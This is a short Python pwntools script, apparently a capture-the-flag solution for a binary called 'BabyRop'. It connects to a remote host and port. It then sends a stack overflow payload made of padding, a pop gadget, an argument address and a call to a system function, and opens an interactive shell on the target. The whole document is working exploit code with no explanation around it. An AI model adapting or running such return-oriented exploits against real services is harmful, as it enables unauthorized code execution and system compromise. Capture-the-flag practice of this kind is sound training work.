from pwn import *

p = remote('192.168.41.51',11000)
#p = process('BabyRop')
attach(p,'b *0x08049269')
pop_edi_ebp_ret = 0x08049332
sys = 0x80491D6

fake = 'a'*(0x28+0x4)
payload = fake + p32(pop_edi_ebp_ret)+p32(0x804C024) + p32(0)
payload += p32(sys)

p.sendline(payload)

p.interactive()